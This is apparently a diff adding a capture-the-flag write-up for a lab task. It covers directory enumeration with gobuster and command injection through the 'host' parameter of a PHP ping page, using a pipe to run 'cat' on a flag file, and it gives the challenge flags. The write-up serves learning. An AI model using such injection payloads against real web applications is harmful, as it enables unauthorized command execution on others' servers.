@@ -222,3 +222,102 @@ Session completed.
 
 Solved:
 `GHOSTTASK5{Zadar_w4s_just_the_b3g1nn1ng}`
+
+---
+
+### TASK-6
+
+*I had to get a hint start this challenge, there is also some metadata hidden in the JPG that tells you some of this*
+
+- In the Manjez, connect to a hidden SSID
+--SSID: GHOSTAMONGUS
+--PW: TASK-5 FLAG
+
+- Enumerate the network with good ole NMAP
+- You will find a webserver running at `10.0.0.1:80`
+- Opening the page in a browser will render this message:
+```text
+You found me. But the real question is...
+
+How good can you look inside of me??
+
+All good tresasure hunts start by creating a MAP to the treasure.
+```
+
+- The `MAP`keyword suggests to run some sort of scan against this target
+- I ran `gobuster` against the server, which led me to an `index.php` page
+```bash
+└─# gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.0.1
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.hta                 (Status: 403) [Size: 313]
+.htpasswd            (Status: 403) [Size: 313]
+.htaccess            (Status: 403) [Size: 313]
+admin                (Status: 403) [Size: 313]
+index.php            (Status: 200) [Size: 240]
+index.html           (Status: 200) [Size: 175]
+javascript           (Status: 301) [Size: 349] [--> http://10.0.0.1/javascript/]
+server-status        (Status: 403) [Size: 313]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+- Now we know that there's some sort of PHP attack that we need to accomplish
+- After much trial & error, found a path to inject commands into the `host` parameter
+```bash
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>Ping Tool</h2>
+    <form method="GET">
+        <input type="text" name="host" placeholder="Enter IP or hostname">
+        <button type="submit">Ping</button>
+    </form>
+    <pre>total 40
+drwxr-x--- 3   33 www-data  4096 Jun  9 01:57 .
+drwxr-xr-x 3 root root      4096 Apr 23  2025 ..
+-rw-r--r-- 1   33 www-data    51 Jun  8 17:57 .htaccess
+drwxr-xr-x 2   33 www-data  4096 Jun  8 17:44 admin
+-rw-r--r-- 1 root root       175 Jun  9 01:57 index.html
+-rw-r--r-- 1   33 www-data   615 Apr 23  2025 index.nginx-debian.html
+-rw-r--r-- 1 root root      1031 Jun  8 18:06 index.php
+-rw-r--r-- 1 root root     10703 Jun  9 01:56 index_copy.html
+</pre>
+</body>
+</html>
+```
+
+- Started looking around and found an `admin` directory, which will lead you to the flag
+
+- Retrieve the flag:
+```bash
+└─# curl "http://10.0.0.1/index.php?host=127.0.0.1%7Ccat%20admin/flag.txt"
+<!DOCTYPE html>
+<html>
+<body>
+    <h2>Ping Tool</h2>
+    <form method="GET">
+        <input type="text" name="host" placeholder="Enter IP or hostname">
+        <button type="submit">Ping</button>
+    </form>
+    <pre>GHOSTTASK6{c0mm4nd_1nj3ct10n_pwn3d}
+</pre>
+</body>
+</html>
+```
+
+Solved:
+`GHOSTTASK6{c0mm4nd_1nj3ct10n_pwn3d}`
